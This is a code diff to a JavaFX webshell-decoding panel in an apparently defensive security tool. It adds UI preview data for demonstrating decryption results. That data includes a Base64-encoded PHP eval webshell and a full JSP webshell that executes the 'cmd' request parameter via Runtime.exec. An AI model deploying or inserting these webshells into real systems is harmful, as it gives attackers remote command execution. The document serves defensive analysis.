@@ -4,6 +4,7 @@ import com.google.gson.Gson;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import com.leewyatt.rxcontrols.controls.RXLineButton;
+import com.potato.potatotool.ToStart;
 import com.potato.potatotool.content.blueTeam.ReadPacketFile;
 import com.potato.potatotool.content.blueTeam.webshellDecrypt.WebShellDecryptService;
 import com.potato.potatotool.content.blueTeam.webshellDecrypt.model.DecryptConfig;
@@ -61,6 +62,28 @@ import static com.potato.potatotool.utils.core.Constants.*;
  * @date 2023/10/7 16:46
  */
 public class PaneWebshellDecode {
+    private static final String WEBSHELL_RESULT_PREVIEW_INPUT =
+            "cGlwZV9kZWNvZGU9JGFfPVJFUVVFU1RbJ2EnXTskYj1iYXNlNjRfZGVjb2RlKCRhXyk7ZXZhbCgkYik7";
+    private static final String WEBSHELL_RESULT_PREVIEW_OUTPUT =
+            "<%@ page language=\"java\" pageEncoding=\"UTF-8\" %>\n" +
+            "<%\n" +
+            "String cmd = request.getParameter(\"cmd\");\n" +
+            "if (cmd != null && cmd.length() > 0) {\n" +
+            "    Process process = Runtime.getRuntime().exec(cmd);\n" +
+            "    java.io.InputStream in = process.getInputStream();\n" +
+            "    byte[] buffer = new byte[1024];\n" +
+            "    int len;\n" +
+            "    while ((len = in.read(buffer)) != -1) {\n" +
+            "        out.print(new String(buffer, 0, len, \"UTF-8\"));\n" +
+            "    }\n" +
+            "}\n" +
+            "%>";
+    private static final String WEBSHELL_OPTION_PREVIEW_KEY = "rebeyond";
+    private static final String WEBSHELL_OPTION_PREVIEW_IV = "5c6e0c2a9f4d1b3e";
+    private static final String WEBSHELL_AI_PREVIEW_TEXT =
+            "1. 识别到典型 Base64 + 默认密钥链路，解密结果为 JSP 命令执行逻辑。\n" +
+            "2. 核心风险点在于直接读取 cmd 参数并调用 Runtime.exec 执行系统命令。\n" +
+            "3. 建议优先结合访问日志、Web 容器进程与异常子进程记录进一步确认落地痕迹。";
 
     @FXML
     private StackPane sPane;
@@ -202,7 +225,62 @@ public class PaneWebshellDecode {
         modeComboBox.getSelectionModel().selectFirst();
         
         // 绑定国际化
-        Platform.runLater(() -> I18nUtils.bindComponents(sPane));
+        Platform.runLater(() -> {
+            I18nUtils.bindComponents(sPane);
+            applyStartupPreviewState();
+        });
+    }
+
+    private void applyStartupPreviewState() {
+        ToStart.StartupPage startupPage = ToStart.getStartupTestPage();
+        if (startupPage == null) {
+            return;
+        }
+
+        if (startupPage == ToStart.StartupPage.BLUE_WEBSHELL_DECODE_RULES) {
+            rulesComboBox.getSelectionModel().select(2);
+            rulesComboChoose(null);
+            inputText.setText(WEBSHELL_RESULT_PREVIEW_INPUT);
+            return;
+        }
+
+        if (startupPage == ToStart.StartupPage.BLUE_WEBSHELL_DECODE_OPTIONS) {
+            rulesComboBox.getSelectionModel().select(1);
+            rulesComboChoose(null);
+            inputText.setText(WEBSHELL_RESULT_PREVIEW_INPUT);
+            customKey.setText(WEBSHELL_OPTION_PREVIEW_KEY);
+            customIv.setText(WEBSHELL_OPTION_PREVIEW_IV);
+            return;
+        }
+
+        if (startupPage == ToStart.StartupPage.BLUE_WEBSHELL_DECODE_RESULT
+                || startupPage == ToStart.StartupPage.BLUE_WEBSHELL_DECODE_AI) {
+            rulesComboBox.getSelectionModel().selectFirst();
+            modeComboBox.getSelectionModel().selectFirst();
+            inputText.setText(WEBSHELL_RESULT_PREVIEW_INPUT);
+            result.replaceText(WEBSHELL_RESULT_PREVIEW_OUTPUT);
+            tipTitle.setText(I18nUtils.getString("webshell.auto.recognize", "[Base64, DefaultKey]"));
+            Tooltip tooltip = new Tooltip(tipTitle.getText());
+            Tooltip.install(tipTitle, tooltip);
+            tipTitle.setVisible(true);
+            tipTitle.setManaged(true);
+            res.put("error", 0);
+            res.put("encodeModeList", Collections.singletonList(Collections.singletonList("Base64 -> DefaultKey")));
+            if (startupPage == ToStart.StartupPage.BLUE_WEBSHELL_DECODE_AI) {
+                applyAiPreviewState();
+            }
+        }
+    }
+
+    private void applyAiPreviewState() {
+        aiPane.setVisible(true);
+        aiTextAreWidthProperty.set(Math.max(0, sPane.getPrefWidth() * 0.8));
+        aiTextArea.setText(WEBSHELL_AI_PREVIEW_TEXT);
+        isAiVisible = true;
+        showAI.setStyle("-fx-background-color: #87CEFA");
+        lastAiTaskSuccess = true;
+        oldData = result.getText();
+        setAiAnalysisState(AiAnalysisState.SUCCESS);
     }
 
     private final ObservableList<Node> contentObj = FXCollections.observableArrayList();
